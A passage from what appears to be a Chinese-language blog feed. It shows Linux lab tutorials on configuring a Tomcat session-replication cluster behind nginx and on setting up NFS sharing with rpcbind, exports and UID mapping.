/data/tomcat/node2/ROOT/index.jsp</span><br>&lt;%@ page import=<span class="hljs-string">&quot;java.util.*&quot;</span> %&gt;<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;tomcat <span class="hljs-built_in">test</span>&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt; Tomcat Website2 &lt;/h1&gt;<br>&lt;div&gt;On  &lt;%=request.getServerName() %&gt;&lt;/div&gt;<br>&lt;div&gt;&lt;%=request.getLocalAddr() + <span class="hljs-string">&quot;:&quot;</span> + request.getLocalPort() %&gt;&lt;/div&gt;<br>&lt;div&gt;SessionID = &lt;span style=<span class="hljs-string">&quot;color:blue&quot;</span>&gt;&lt;%=session.getId() %&gt;&lt;/span&gt;&lt;/div&gt;<br>&lt;%=new Date()%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#重启生效</span><br>[root@tomcat2 ~]<span class="hljs-comment"># systemctl restart tomcat</span><br></code></pre></td></tr></table></figure><h3 id="（5）验证"><a href="#（5）验证" class="headerlink" title="（5）验证"></a>（5）验证</h3><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221228172647093-490970275.png"><img src="2927659-20221228172647093-490970275.png" alt="img"></a><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221228172641019-1801670515.png"><img src="2927659-20221228172641019-1801670515.png" alt="img"></a></p><h2 id="-8"><a href="#-8" class="headerlink" title=""></a></h2><hr><h2 id="十、实现tomcat会话复制集群"><a href="#十、实现tomcat会话复制集群" class="headerlink" title="十、实现tomcat会话复制集群"></a>十、实现tomcat会话复制集群</h2><blockquote><p><strong>环境：</strong></p><p>dns：10.0.0.20</p><p>nginx：10.0.0.30</p><p>tomcat1：10.0.0.40</p><p>tomcat2：10.0.0.50</p><p>dns配置同上（第九题）</p><p><strong>官方集群会话复制配置网址（根据自身tomcat版本参考）：<a href="https://tomcat.apache.org/tomcat-9.0-doc/cluster-howto.html">https://tomcat.apache.org/tomcat-9.0-doc/cluster-howto.html</a></strong></p><p><strong>注意：官方tomcat7版本配置末尾少/</strong></p><p><strong><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221228185207217-2003315772.png"><img src="2927659-20221228185207217-2003315772.png" alt="img"></a></strong></p></blockquote><h3 id="（1）nginx配置"><a href="#（1）nginx配置" class="headerlink" title="（1）nginx配置"></a>（1）nginx配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@nginx ~]<span class="hljs-comment"># vim /apps/nginx/conf/nginx.conf</span><br>http &#123;<br>    ...省略...<br>    upstream tomcat-server &#123;<br>        server 10.0.0.40:8080;   <span class="hljs-comment">#可加weight（权重）等</span><br>        server 10.0.0.50:8080;<br>    &#125;<br><br>    server &#123;<br>        listen       80;<br>        server_name  localhost;<br><br>        <span class="hljs-comment">#charset koi8-r;</span><br><br>        <span class="hljs-comment">#access_log  logs/host.access.log  main;</span><br><br>        location / &#123;<br>            root   html;<br>            index  index.html index.htm;<br>            proxy_pass http://tomcat-server;<br>            proxy_set_header Host <span class="hljs-variable">$http_host</span>;<br>        &#125;<br>    ...省略...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@nginx ~]<span class="hljs-comment"># nginx -s reload</span><br></code></pre></td></tr></table></figure><h3 id="（2）tomcat1配置"><a href="#（2）tomcat1配置" class="headerlink" title="（2）tomcat1配置"></a>（2）tomcat1配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在新增的Host里面增加集群配置</span><br><span class="hljs-comment">#只需要修改address=&quot;auto&quot;为本机的ip地址</span><br>[root@tomcat1 ~]<span class="hljs-comment"># vim /usr/local/tomcat/conf/server.xml</span><br>    &lt;Host name=<span class="hljs-string">&quot;www.willoneday.org&quot;</span>  appBase=<span class="hljs-string">&quot;/data/tomcat/node1&quot;</span><br>            unpackWARs=<span class="hljs-string">&quot;true&quot;</span> autoDeploy=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>        &lt;Cluster className=<span class="hljs-string">&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot;</span><br>                 channelSendOptions=<span class="hljs-string">&quot;8&quot;</span>&gt;<br><br>          &lt;Manager className=<span class="hljs-string">&quot;org.apache.catalina.ha.session.DeltaManager&quot;</span><br>                   expireSessionsOnShutdown=<span class="hljs-string">&quot;false&quot;</span><br>                   notifyListenersOnReplication=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br><br>          &lt;Channel className=<span class="hljs-string">&quot;org.apache.catalina.tribes.group.GroupChannel&quot;</span>&gt;<br>            &lt;Membership className=<span class="hljs-string">&quot;org.apache.catalina.tribes.membership.McastService&quot;</span><br>                        address=<span class="hljs-string">&quot;228.0.0.4&quot;</span>      <span class="hljs-comment">#指定的多播地址；D类：224-239</span><br>                        port=<span class="hljs-string">&quot;45564&quot;</span>             <span class="hljs-comment">#45564/UDP</span><br>                        frequency=<span class="hljs-string">&quot;500&quot;</span>          <span class="hljs-comment">#间隔500ms发送</span><br>                        dropTime=<span class="hljs-string">&quot;3000&quot;</span>/&gt;        <span class="hljs-comment">#故障阈值3s</span><br>            &lt;Receiver className=<span class="hljs-string">&quot;org.apache.catalina.tribes.transport.nio.NioReceiver&quot;</span><br>                      address=<span class="hljs-string">&quot;10.0.0.40&quot;</span>        <span class="hljs-comment">#监听地址,此项建议修改为当前主机的IP</span><br>                      port=<span class="hljs-string">&quot;4000&quot;</span>                <span class="hljs-comment">#监听端口</span><br>                      autoBind=<span class="hljs-string">&quot;100&quot;</span>             <span class="hljs-comment">#如果端口冲突,自动绑定其它端口,范围是4000-4100</span><br>                      selectorTimeout=<span class="hljs-string">&quot;5000&quot;</span>     <span class="hljs-comment">#自动绑定超时时长5s</span><br>                      maxThreads=<span class="hljs-string">&quot;6&quot;</span>/&gt;<br><br>            &lt;Sender className=<span class="hljs-string">&quot;org.apache.catalina.tribes.transport.ReplicationTransmitter&quot;</span>&gt;<br>              &lt;Transport className=<span class="hljs-string">&quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender&quot;</span>/&gt;<br>            &lt;/Sender&gt;<br>            &lt;Interceptor className=<span class="hljs-string">&quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector&quot;</span>/&gt;<br>            &lt;Interceptor className=<span class="hljs-string">&quot;org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor&quot;</span>/&gt;<br>          &lt;/Channel&gt;<br><br>          &lt;Valve className=<span class="hljs-string">&quot;org.apache.catalina.ha.tcp.ReplicationValve&quot;</span><br>                 filter=<span class="hljs-string">&quot;&quot;</span>/&gt;<br>          &lt;Valve className=<span class="hljs-string">&quot;org.apache.catalina.ha.session.JvmRouteBinderValve&quot;</span>/&gt;<br><br>          &lt;Deployer className=<span class="hljs-string">&quot;org.apache.catalina.ha.deploy.FarmWarDeployer&quot;</span><br>                    tempDir=<span class="hljs-string">&quot;/tmp/war-temp/&quot;</span><br>                    deployDir=<span class="hljs-string">&quot;/tmp/war-deploy/&quot;</span><br>                    watchDir=<span class="hljs-string">&quot;/tmp/war-listen/&quot;</span><br>                    watchEnabled=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br><br>          &lt;ClusterListener className=<span class="hljs-string">&quot;org.apache.catalina.ha.session.ClusterSessionListener&quot;</span>/&gt;<br>        &lt;/Cluster&gt;<br>    &lt;/Host&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注意：WEB-INF目录必须给tomcat权限</span><br>[root@tomcat1 ~]<span class="hljs-comment"># cp -a /usr/local/tomcat/webapps/ROOT/WEB-INF /data/tomcat/node1/ROOT/</span><br>[root@tomcat1 ~]<span class="hljs-comment"># ll /data/tomcat/node1/ROOT/</span><br>total 4<br>-rw-r--r-- 1 root   root   399 Dec 28 16:21 index.jsp<br>drwxr-x--- 2 tomcat tomcat  21 Dec 28 18:05 WEB-INF<br><br>[root@tomcat1 ~]<span class="hljs-comment"># vim /data/tomcat/node1/ROOT/WEB-INF/web.xml</span><br>  &lt;/description&gt;<br>  &lt;distributable/&gt;     <span class="hljs-comment">#在文件末尾倒数第二行增加此行</span><br>&lt;/web-app&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tomcat1 ~]<span class="hljs-comment"># systemctl restart tomcat</span><br></code></pre></td></tr></table></figure><h3 id="（3）tomcat2配置"><a href="#（3）tomcat2配置" class="headerlink" title="（3）tomcat2配置"></a>（3）tomcat2配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在新增的Host里面增加集群配置</span><br><span class="hljs-comment">#只需要修改address=&quot;auto&quot;为本机的ip地址</span><br>[root@tomcat2 ~]<span class="hljs-comment"># vim /usr/local/tomcat/conf/server.xml</span><br>    &lt;Host name=<span class="hljs-string">&quot;www.willoneday.org&quot;</span>  appBase=<span class="hljs-string">&quot;/data/tomcat/node2&quot;</span><br>            unpackWARs=<span class="hljs-string">&quot;true&quot;</span> autoDeploy=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>        &lt;Cluster className=<span class="hljs-string">&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot;</span><br>                 channelSendOptions=<span class="hljs-string">&quot;8&quot;</span>&gt;<br><br>          &lt;Manager className=<span class="hljs-string">&quot;org.apache.catalina.ha.session.DeltaManager&quot;</span><br>                   expireSessionsOnShutdown=<span class="hljs-string">&quot;false&quot;</span><br>                   notifyListenersOnReplication=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br><br>          &lt;Channel className=<span class="hljs-string">&quot;org.apache.catalina.tribes.group.GroupChannel&quot;</span>&gt;<br>            &lt;Membership className=<span class="hljs-string">&quot;org.apache.catalina.tribes.membership.McastService&quot;</span><br>                        address=<span class="hljs-string">&quot;228.0.0.4&quot;</span><br>                        port=<span class="hljs-string">&quot;45564&quot;</span><br>                        frequency=<span class="hljs-string">&quot;500&quot;</span><br>                        dropTime=<span class="hljs-string">&quot;3000&quot;</span>/&gt;<br>            &lt;Receiver className=<span class="hljs-string">&quot;org.apache.catalina.tribes.transport.nio.NioReceiver&quot;</span><br>                      address=<span class="hljs-string">&quot;10.0.0.50&quot;</span><br>                      port=<span class="hljs-string">&quot;4000&quot;</span><br>                      autoBind=<span class="hljs-string">&quot;100&quot;</span><br>                      selectorTimeout=<span class="hljs-string">&quot;5000&quot;</span><br>                      maxThreads=<span class="hljs-string">&quot;6&quot;</span>/&gt;<br><br>            &lt;Sender className=<span class="hljs-string">&quot;org.apache.catalina.tribes.transport.ReplicationTransmitter&quot;</span>&gt;<br>              &lt;Transport className=<span class="hljs-string">&quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender&quot;</span>/&gt;<br>            &lt;/Sender&gt;<br>            &lt;Interceptor className=<span class="hljs-string">&quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector&quot;</span>/&gt;<br>            &lt;Interceptor className=<span class="hljs-string">&quot;org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor&quot;</span>/&gt;<br>          &lt;/Channel&gt;<br><br>          &lt;Valve className=<span class="hljs-string">&quot;org.apache.catalina.ha.tcp.ReplicationValve&quot;</span><br>                 filter=<span class="hljs-string">&quot;&quot;</span>/&gt;<br>          &lt;Valve className=<span class="hljs-string">&quot;org.apache.catalina.ha.session.JvmRouteBinderValve&quot;</span>/&gt;<br><br>          &lt;Deployer className=<span class="hljs-string">&quot;org.apache.catalina.ha.deploy.FarmWarDeployer&quot;</span><br>                    tempDir=<span class="hljs-string">&quot;/tmp/war-temp/&quot;</span><br>                    deployDir=<span class="hljs-string">&quot;/tmp/war-deploy/&quot;</span><br>                    watchDir=<span class="hljs-string">&quot;/tmp/war-listen/&quot;</span><br>                    watchEnabled=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br><br>          &lt;ClusterListener className=<span class="hljs-string">&quot;org.apache.catalina.ha.session.ClusterSessionListener&quot;</span>/&gt;<br>        &lt;/Cluster&gt;<br>    &lt;/Host&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注意：WEB-INF目录必须给tomcat权限</span><br>[root@tomcat2 ~]<span class="hljs-comment"># cp -a /usr/local/tomcat/webapps/ROOT/WEB-INF /data/tomcat/node2/ROOT/</span><br><br>[root@tomcat2 ~]<span class="hljs-comment"># vim /data/tomcat/node2/ROOT/WEB-INF/web.xml</span><br>  &lt;/description&gt;<br>  &lt;distributable/&gt;     <span class="hljs-comment">#在文件末尾倒数第二行增加此行</span><br>&lt;/web-app&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@tomcat2 ~]<span class="hljs-comment"># systemctl restart tomcat</span><br></code></pre></td></tr></table></figure><h3 id="（4）验证"><a href="#（4）验证" class="headerlink" title="（4）验证"></a>（4）验证</h3><blockquote><p>现在同一个网站调度到了不同的机器上，但是sessionid并没有改变。<strong>但是这种复制并不适合大型网站，众所周知tomcat占内存高，如果后端tomcat过多，sessionid复制就会占很大内存。只适合于小网站。</strong></p></blockquote><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221228185508157-635635773.png"><img src="2927659-20221228185508157-635635773.png" alt="img"></a></p><p><a href="https://img2023.cnblogs.com/blog/2927659/202212/2927659-20221228185501522-1289819615.png"><img src="2927659-20221228185501522-1289819615.png" alt="img"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux文件共享NAS+rsync</title>
    <link href="/2023/07/28/linux%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%ABNAS-rsync/"/>
    <url>/2023/07/28/linux%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%ABNAS-rsync/</url>
    
    <content type="html"><![CDATA[<h1 id="文件共享NAS-rync"><a href="#文件共享NAS-rync" class="headerlink" title="文件共享NAS+rync"></a>文件共享NAS+rync</h1><p>日常使用：NAS比较多，公有云基本也是使用NAS，包括后续的PVC也有两种模式：云盘版本和NAS版本</p><p>NAS：直接进行挂载，要安装软件，NFS协议，可以共享挂载，存在一定的性能瓶颈</p><p>文件系统分类：EXT4，XFS，NFS（网络共享）</p><p>VFS：屏蔽了底层文件系统的差异，给到操作系统指令去读，操作系统可以直接读到NAS内的内容，服务叫NAS，文件系统协议叫NFS</p><p>类似MySQL的锁机制，NAS的文件共享也会被多个人访问，需要确保每个人的修改不要产生冲突，可以将用户上传的图片直接放到NAS上</p><h2 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h2><p>NAS的服务起来后，会有端口号时常变化的情况，需要使用到注册中心；一旦NAS的服务启动了，就不会变了，包括NAS服务器的IP；用户想要访问NAS，就去到注册中心获取IP+端口，就可以访问了</p><p>类似nacos注册中心，也是可以将微服务注册到nacos，用户/k8s/服务器等访问服务的时候，直接访问到nacos，访问微服务—&gt;pod，一个微服务=一个pod/services，对外提供服务</p><p><img src="2792175-20221028232750861-1616131068.png" alt="image-20221002115415916"></p><p>基于RPC服务/协议来进行连接的(监听端口111)，RPMBIND服务</p><p>先连接注册中心—访问到NAS服务—通过RPC服务(TCP)协议，连接到RPC，从而访问NFS服务，不管是mount也好还是访问/修改文件也好</p><p><img src="2792175-20221028232747504-1654273385.png" alt="image-20221002120706357"></p><h1 id="搭建NFS文件共享系统"><a href="#搭建NFS文件共享系统" class="headerlink" title="搭建NFS文件共享系统"></a>搭建NFS文件共享系统</h1><h2 id="1-安装相关软件包"><a href="#1-安装相关软件包" class="headerlink" title="1.安装相关软件包"></a>1.安装相关软件包</h2><p>必备软件包：nfs-utils，客户端+服务端，自带nfs-server和nfs-utils客户端</p><p>rpcbind：注册中心，监听111端口—&gt;相关依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">yum -y install rpcbind nfs-utils<br><br>rpm -ql nfs-utils | grep rpc<br>systemctl status rpcbind<br><br>ss -ntl | grep 111<br>netstat -ntlp | grep rpcbind<br>tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      4522/rpcbind        <br>tcp6       0      0 :::111                  :::*                    LISTEN      4522/rpcbind<br><br><span class="hljs-comment">##rpc服务以前叫portmapper</span><br>rpcinfo -p<br>   program vers proto   port  service<br>    100000    4   tcp    111  portmapper<br>    100000    3   tcp    111  portmapper<br>    100000    2   tcp    111  portmapper<br>    100000    4   udp    111  portmapper<br>    100000    3   udp    111  portmapper<br>    100000    2   udp    111  portmapper<br></code></pre></td></tr></table></figure><p><img src="2792175-20221028232747954-1843971664.png" alt="image-20221002122141926"></p><p>NFS监听端口号特别多，都是基于一些程序，服务提供的</p><h2 id="2-启动nfs-server服务，观察端口号，只读权限查看"><a href="#2-启动nfs-server服务，观察端口号，只读权限查看" class="headerlink" title="2.启动nfs-server服务，观察端口号，只读权限查看"></a>2.启动nfs-server服务，观察端口号，只读权限查看</h2><p>showmount -e 10.0.0.129：看129的机器上有没有共享出来的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start nfs-server<br><br><span class="hljs-comment">##创建两个目录</span><br>[12:35:53 root@slave1 data]<span class="hljs-comment">#mkdir nfs-share1</span><br>[12:36:00 root@slave1 data]<span class="hljs-comment">#mkdir nfs-share2</span><br><br><span class="hljs-comment">##修改NFS共享目录配置</span><br>vim /etc/exports<br><br>/data/nfs-share1 *() ---&gt;共享哪个目录，其他人对他的权限，*代表所有，*(rw)代表读写<br>/data/nfs-share1 *(rw) ---&gt;*(rw)代表读写<br><br><span class="hljs-comment">##查看当前共享的目录</span><br>exportfs -v<br><span class="hljs-comment">##使配置文件生效</span><br>exportfs -r<br><br>[13:52:40 root@slave1 data]<span class="hljs-comment">#exportfs -v</span><br>/data/nfs-share1<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)<br>目前是只读的状态<br><br><span class="hljs-comment">##客户端挂载NAS</span><br>master<br>yum -y install nfsutils<br><span class="hljs-built_in">mkdir</span> -p /data/nfs<br><br><span class="hljs-comment">##showmount，这估计是访问111端口的</span><br>showmount -e 10.0.0.129<br>Export list <span class="hljs-keyword">for</span> 10.0.0.129:<br>/data/nfs-share1 *<br><br><span class="hljs-comment">##挂载NAS，使用的是nfs4的文件系统</span><br>mount 10.0.0.129:/data/nfs-share1 /data/nfs<br><span class="hljs-built_in">df</span> -Th | grep nfs<br>10.0.0.129:/data/nfs-share1 nfs4       98G   17G   82G  17% /data/nfs<br><br><span class="hljs-comment">##修改为rw读写权限</span><br>/data/nfs-share1 *(rw) ---&gt;*(rw)代表读写<br>[root@slave1 nfs-share1]<span class="hljs-comment">#exportfs -v</span><br>/data/nfs-share1<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,no_all_squash)<br></code></pre></td></tr></table></figure><h2 id="3-修改权限，映射账号，实现读写"><a href="#3-修改权限，映射账号，实现读写" class="headerlink" title="3.修改权限，映射账号，实现读写"></a>3.修改权限，映射账号，实现读写</h2><p>对于NFS的服务来讲：先在NFS服务器授权共享目录</p><p>1.远程NFS客户端访问的用户，是根据UID来判断在nfs目录上写的用户/用户组的；比如root—&gt;nobody，但是普通用户就是普通用户，写上远端服务器的UID+GID</p><p>2.修改共享目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@slave1 nfs-share1]<span class="hljs-comment">#grep nobody /etc/passwd</span><br>nobody:x:99:99:Nobody:/:/sbin/nologin<br>nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br><br><span class="hljs-comment">##others实现读写</span><br><span class="hljs-built_in">chmod</span> 647 /data/nfs-share1<br>drw-r--rwx   2 root    root      32 Oct  2 13:54 nfs-share1<br><br><span class="hljs-comment">##root新建文件</span><br>这个变成nfsnobody了<br>[root@master nfs]<span class="hljs-comment">#echo 3test &gt;&gt; 3.txt</span><br>[root@master nfs]<span class="hljs-comment">#ll</span><br>total 12<br>-rw-r--r-- 1 root      root      501 Oct  2 13:54 1.txt<br>-rw-r--r-- 1 root      root      501 Oct  2 13:54 2.txt<br>-rw-r--r-- 1 nfsnobody nfsnobody   6 Oct  2 14:33 3.txt<br><br><span class="hljs-comment">##root用户被压榨成nfsnobody，root_squash</span><br><span class="hljs-comment">#这个ID为65534，证明是同一个账户，NFS服务器通过UID来判断</span><br>/data/nfs-share1<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,no_all_squash)<br><br>[root@master nfs]<span class="hljs-comment">#id nfsnobody</span><br>uid=65534(nfsnobody) gid=65534(nfsnobody) <span class="hljs-built_in">groups</span>=65534(nfsnobody)<br><br>-rw-r--r-- 1 nfsnobody nfsnobody   6 Oct  2 14:33 3.txt<br>[root@slave1 nfs-share1]<span class="hljs-comment">#id nfsnobody</span><br>uid=65534(nfsnobody) gid=65534(nfsnobody) <span class="hljs-built_in">groups</span>=65534(nfsnobody)<br><br><br><span class="hljs-comment">#我使用普通用户来创建，ikun的uid和gid分别为1004和1006</span><br>[ikun@master nfs]$ <span class="hljs-built_in">echo</span> ikun &gt;&gt; ikun.txt<br>[ikun@master nfs]$ ll<br>total 16<br>-rw-r--r-- 1 root      root      501 Oct  2 13:54 1.txt<br>-rw-r--r-- 1 root      root      501 Oct  2 13:54 2.txt<br>-rw-r--r-- 1 nfsnobody nfsnobody   6 Oct  2 14:33 3.txt<br>-rw-rw-r-- 1 ikun      ikun        5 Oct  2 14:37 ikun.txt<br>[ikun@master nfs]$ <span class="hljs-built_in">id</span> ikun<br>uid=1004(ikun) gid=1006(ikun) <span class="hljs-built_in">groups</span>=1006(ikun)<br><br><span class="hljs-comment">#这边只会显示1004和1006的uid+gid，想实现在NFS服务器看到需要创建一个UID和GID和ikun一样的账号才行</span><br>[root@slave1 nfs-share1]<span class="hljs-comment">#ll</span><br>total 16<br>-rw-r--r-- 1 root      root      501 Oct  2 13:54 1.txt<br>-rw-r--r-- 1 root      root      501 Oct  2 13:54 2.txt<br>-rw-r--r-- 1 nfsnobody nfsnobody   6 Oct  2 14:33 3.txt<br>-rw-rw-r-- 1      1004      1006   5 Oct  2 14:37 ikun.txt<br></code></pre></td></tr></table></figure><h2 id="4-修改所有写入的账号映射成同一个账号nfsnobody，包括root"><a href="#4-修改所有写入的账号映射成同一个账号nfsnobody，包括root" class="headerlink" title="4.修改所有写入的账号映射成同一个账号nfsnobody，包括root"></a>4.修改所有写入的账号映射成同一个账号nfsnobody，包括root</h2><p>区分是那个账号写入的，也可以使用，统一映射成nfsnobody这个账号，统一UID和GID</p><p>可以实现给多个WEB主机写图片，映射到他们的web目录下，比如说/apps/nginx/data/pic下，这样用户写图片的时候就写到nfs的空间，而不是写到web服务器的磁盘上，节省空间，高效云盘即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 